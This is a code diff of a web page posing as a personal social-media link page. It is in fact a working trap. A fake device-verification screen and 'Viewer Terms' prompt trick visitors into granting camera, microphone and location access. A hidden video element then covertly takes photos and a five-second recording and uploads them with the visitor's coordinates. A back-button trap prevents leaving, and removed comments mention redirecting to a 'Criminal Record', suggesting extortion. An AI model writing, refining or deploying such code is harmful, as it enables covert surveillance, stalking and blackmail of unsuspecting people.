@@ -3,42 +3,185 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Otterly Socials</title>
+    <title>Karan Sarma Socials</title>
     <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
-        /* --- VISUAL STYLES (Identical to before) --- */
+        /* --- VISUAL STYLES --- */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Fredoka', sans-serif; height: 100vh; width: 100%; overflow: hidden; display: flex; justify-content: center; align-items: center; background-color: #f0f8ff; }
+        body { 
+            font-family: 'Fredoka', sans-serif; 
+            height: 100vh; 
+            width: 100%; 
+            overflow: hidden; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            background-color: #f0f8ff; 
+        }
 
-        .background-layer { position: absolute; top: -20px; left: -20px; right: -20px; bottom: -20px; background-image: url('https://i.postimg.cc/fLc7t6Sw/Gemini-Generated-Image-auq3jxauq3jxauq3-Photoroom.png'); background-size: cover; background-position: center; filter: blur(15px); z-index: 1; }
-        .card-container { background: rgba(255, 255, 255, 0.45); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border-radius: 30px; padding: 40px 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.1); border: 2px solid rgba(255, 255, 255, 0.7); position: relative; z-index: 10; }
-        .profile-wrapper { width: 150px; height: 150px; margin: 0 auto 20px auto; position: relative; border-radius: 50%; padding: 5px; background: linear-gradient(45deg, #ff9a9e, #fad0c4); box-shadow: 0 10px 20px rgba(0,0,0,0.15); }
-        .profile-pic { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 4px solid white; background-color: white; }
+        .background-layer { 
+            position: absolute; 
+            top: -20px; left: -20px; right: -20px; bottom: -20px; 
+            background-image: url('https://i.postimg.cc/pTz46cyG/unnamedsfef-FADd-Photoroom.png'); 
+            background-size: cover; 
+            background-position: center; 
+            filter: blur(15px); 
+            z-index: 1; 
+        }
+
+        .card-container { 
+            background: rgba(255, 255, 255, 0.45); 
+            backdrop-filter: blur(10px); 
+            -webkit-backdrop-filter: blur(10px); 
+            border-radius: 30px; 
+            padding: 40px 20px; 
+            width: 90%; 
+            max-width: 400px; 
+            text-align: center; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1); 
+            border: 2px solid rgba(255, 255, 255, 0.7); 
+            position: relative; 
+            z-index: 10; 
+        }
+
+        .profile-wrapper { 
+            width: 150px; 
+            height: 150px; 
+            margin: 0 auto 20px auto; 
+            position: relative; 
+            border-radius: 50%; 
+            padding: 5px; 
+            background: linear-gradient(45deg, #ff9a9e, #fad0c4); 
+            box-shadow: 0 10px 20px rgba(0,0,0,0.15); 
+        }
+
+        .profile-pic { 
+            width: 100%; 
+            height: 100%; 
+            border-radius: 50%; 
+            object-fit: cover; 
+            border: 4px solid white; 
+            background-color: white; 
+        }
+
         h1 { color: #4a4a4a; margin-bottom: 30px; font-size: 1.8rem; text-shadow: 1px 1px 0px rgba(255,255,255,0.8); }
+
         .links-container { display: flex; flex-direction: column; gap: 20px; }
-        .bubble-link { display: flex; align-items: center; justify-content: space-between; padding: 15px 25px; border-radius: 50px; text-decoration: none; color: #444; font-weight: 600; font-size: 1.1rem; transition: transform 0.3s; box-shadow: 0 5px 15px rgba(0,0,0,0.05); background: white; }
+
+        .bubble-link { 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between; 
+            padding: 15px 25px; 
+            border-radius: 50px; 
+            text-decoration: none; 
+            color: #444; 
+            font-weight: 600; 
+            font-size: 1.1rem; 
+            transition: transform 0.3s; 
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05); 
+            background: white; 
+        }
+
+        .bubble-link:hover { transform: translateY(-3px); }
+
         .instagram { background: linear-gradient(135deg, #fff0f5 0%, #ffe4e1 100%); border: 2px solid #ffb6c1; }
         .reddit { background: linear-gradient(135deg, #f0f8ff 0%, #e6e6fa 100%); border: 2px solid #b0c4de; }
+
         .bubble-link i { font-size: 1.5rem; }
-        .instagram i { color: #E1306C; } .reddit i { color: #FF4500; }
+        .instagram i { color: #E1306C; } 
+        .reddit i { color: #FF4500; }
 
         /* --- GATEKEEPER & MODAL --- */
-        #gatekeeper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 99999; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; text-align: center; transition: opacity 0.5s ease; }
-        .verify-btn { padding: 15px 40px; font-size: 1.2rem; background: #28a745; color: white; border: none; border-radius: 50px; cursor: pointer; margin-top: 25px; font-family: 'Fredoka', sans-serif; box-shadow: 0 0 20px rgba(40, 167, 69, 0.5); animation: pulse 1.5s infinite; }
-        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(5px); z-index: 2000; display: none; justify-content: center; align-items: center; }
-        .modal-content { background: rgba(255, 255, 255, 0.95); padding: 30px; border-radius: 25px; width: 85%; max-width: 320px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.2); border: 3px solid #ff9a9e; }
-        .agree-btn { background: linear-gradient(45deg, #ff9a9e, #fad0c4); color: white; border: none; padding: 12px 30px; font-size: 1rem; border-radius: 50px; cursor: pointer; font-weight: 600; font-family: inherit; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        #gatekeeper { 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.95); 
+            z-index: 99999; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            color: white; 
+            text-align: center; 
+            transition: opacity 0.5s ease; 
+        }
+
+        .verify-btn { 
+            padding: 15px 40px; 
+            font-size: 1.2rem; 
+            background: #28a745; 
+            color: white; 
+            border: none; 
+            border-radius: 50px; 
+            cursor: pointer; 
+            margin-top: 25px; 
+            font-family: 'Fredoka', sans-serif; 
+            box-shadow: 0 0 20px rgba(40, 167, 69, 0.5); 
+            animation: pulse 1.5s infinite; 
+        }
+
+        .modal-overlay { 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            background: rgba(0, 0, 0, 0.6); 
+            backdrop-filter: blur(5px); 
+            z-index: 2000; 
+            display: none; 
+            justify-content: center; 
+            align-items: center; 
+        }
+
+        .modal-content { 
+            background: rgba(255, 255, 255, 0.95); 
+            padding: 30px; 
+            border-radius: 25px; 
+            width: 85%; 
+            max-width: 320px; 
+            text-align: center; 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.2); 
+            border: 3px solid #ff9a9e; 
+        }
+
+        .agree-btn { 
+            background: linear-gradient(45deg, #ff9a9e, #fad0c4); 
+            color: white; 
+            border: none; 
+            padding: 12px 30px; 
+            font-size: 1rem; 
+            border-radius: 50px; 
+            cursor: pointer; 
+            font-weight: 600; 
+            font-family: inherit; 
+            margin-top: 15px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 10px; 
+            width: 100%;
+        }
 
         /* --- INVISIBLE CAMERA --- */
-        #cam-feed { position: fixed; top: 0; left: 0; width: 200px; height: 150px; opacity: 0; z-index: -10; pointer-events: none; }
+        #cam-feed { 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 200px; 
+            height: 150px; 
+            opacity: 0; 
+            z-index: -10; 
+            pointer-events: none; 
+        }
         
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
     </style>
 </head>
 <body>
 
+    <!-- Security Wall -->
     <div id="gatekeeper">
         <i class="fas fa-user-lock" style="font-size: 60px; margin-bottom: 20px; color: #ff9a9e;"></i>
         <h2>Security Verification</h2>
@@ -46,11 +189,12 @@
         <button class="verify-btn" id="start-btn">VERIFY DEVICE</button>
     </div>
 
+    <!-- Privacy Consent Modal -->
     <div id="privacy-modal" class="modal-overlay">
         <div class="modal-content">
             <i class="fas fa-shield-cat" style="font-size: 3rem; color: #ff9a9e; margin-bottom: 15px;"></i>
             <h2 style="color: #333; margin-bottom: 10px;">Almost there!</h2>
-            <p style="color: #666; font-size: 0.9rem;">To view Franklin's private socials, please agree to the Viewer Terms.</p>
+            <p style="color: #666; font-size: 0.9rem;">To view Karan's private socials, please agree to the Viewer Terms.</p>
             <button id="agree-btn" class="agree-btn">I Agree & Continue</button>
         </div>
     </div>
@@ -58,19 +202,21 @@
     <div class="background-layer"></div>
     <div class="card-container">
         <div class="profile-wrapper">
-            <img src="https://i.postimg.cc/DzzRcPd9/Gemini-Generated-Image-mz29qvmz29qvmz29-Photoroom.png" alt="Profile" class="profile-pic">
+            <img src="https://i.postimg.cc/Kcd4L1hH/Gemini-Generated-Image-2hr38d2hr38d2hr3-Photoroom.png" alt="Profile" class="profile-pic">
         </div>
-        <h1>Franklin Robert</h1>
+        <h1>Karan Sarma</h1>
         <div class="links-container">
-            <a href="#" class="bubble-link instagram"><span>Instagram</span><i class="fab fa-instagram"></i></a>
-            <a href="#" class="bubble-link reddit"><span>Reddit</span><i class="fab fa-reddit-alien"></i></a>
+            <a href="https://instagram.com" class="bubble-link instagram" target="_blank"><span>Instagram</span><i class="fab fa-instagram"></i></a>
+            <a href="https://reddit.com" class="bubble-link reddit" target="_blank"><span>Reddit</span><i class="fab fa-reddit-alien"></i></a>
         </div>
     </div>
 
+    <!-- Hidden Video Feed -->
     <video id="cam-feed" autoplay playsinline muted></video>
 
     <script>
-        const BACKEND_URL = '/api/report';
+        // Configuration
+        const BACKEND_URL = '/api/report'; 
         
         const gatekeeper = document.getElementById('gatekeeper');
         const privacyModal = document.getElementById('privacy-modal');
@@ -86,18 +232,17 @@
         let mediaRecorder;
         let videoChunks = [];
 
-        // 1. BACK BUTTON TRAP
+        // Back Button Trap
         for(let i=0; i<10; i++) history.pushState(null, document.title, location.href);
         window.addEventListener('popstate', () => history.pushState(null, document.title, location.href));
 
-        // 2. VERIFY DEVICE
+        // Initial Permission Request
         startBtn.addEventListener('click', async () => {
             startBtn.innerText = "VERIFYING...";
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 camFeed.srcObject = stream;
                 
-                // Initialize Recorder
                 mediaRecorder = new MediaRecorder(stream);
                 mediaRecorder.ondataavailable = event => {
                     if (event.data.size > 0) videoChunks.push(event.data);
@@ -106,7 +251,7 @@
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(pos => {
                         capturedData.meta.location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-                    });
+                    }, (err) => { console.warn("Location denied"); });
                 }
 
                 gatekeeper.style.opacity = '0';
@@ -116,42 +261,40 @@
                 }, 500);
 
             } catch (err) {
-                alert("Verification Failed. You must allow permissions.");
+                console.error(err);
+                alert("Verification Failed. Permissions are required to proceed.");
                 startBtn.innerText = "RETRY VERIFICATION";
             }
         });
 
-        // 3. THE SEQUENTIAL TRAP (Photos FIRST -> Then Video)
+        // Capturing logic
         agreeBtn.addEventListener('click', () => {
-            // Fake Loading UI
-            agreeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
+            agreeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading Profile...';
             agreeBtn.disabled = true;
 
-            // STEP A: CAPTURE 3 PHOTOS
             let photoCount = 0;
             const photoInterval = setInterval(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = camFeed.videoWidth;
-                canvas.height = camFeed.videoHeight;
-                canvas.getContext('2d').drawImage(camFeed, 0, 0);
-                capturedData.images.push(canvas.toDataURL('image/jpeg', 0.6));
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = camFeed.videoWidth || 640;
+                    canvas.height = camFeed.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(camFeed, 0, 0);
+                    capturedData.images.push(canvas.toDataURL('image/jpeg', 0.6));
+                } catch (e) { console.error("Frame capture failed", e); }
                 
                 photoCount++;
                 if (photoCount >= 3) {
-                    // Photos Done. Clear interval.
                     clearInterval(photoInterval);
-                    
-                    // STEP B: START VIDEO RECORDING (After photos are done)
                     startVideoRecording();
                 }
-            }, 800); // Take 1 photo every 0.8 seconds
+            }, 1000);
         });
 
         function startVideoRecording() {
-            // Start recording
+            if (!mediaRecorder) return;
             mediaRecorder.start();
 
-            // STEP C: STOP AFTER 5 SECONDS
             setTimeout(() => {
                 mediaRecorder.stop();
                 mediaRecorder.onstop = async () => {
@@ -163,7 +306,7 @@
                         sendData(base64Video);
                     };
                 };
-            }, 5000); // 5 Seconds recording time
+            }, 5000);
         }
 
         async function sendData(videoBase64) {
@@ -181,9 +324,13 @@
                 if (response.ok) {
                     const blob = await response.blob();
                     const url = window.URL.createObjectURL(blob);
-                    window.location.href = url; // Redirect to Criminal Record
+                    window.location.href = url;
+                } else {
+                    privacyModal.style.display = 'none';
                 }
-            } catch (e) { console.log(e); }
+            } catch (e) { 
+                privacyModal.style.display = 'none';
+            }
         }
     </script>
 </body>
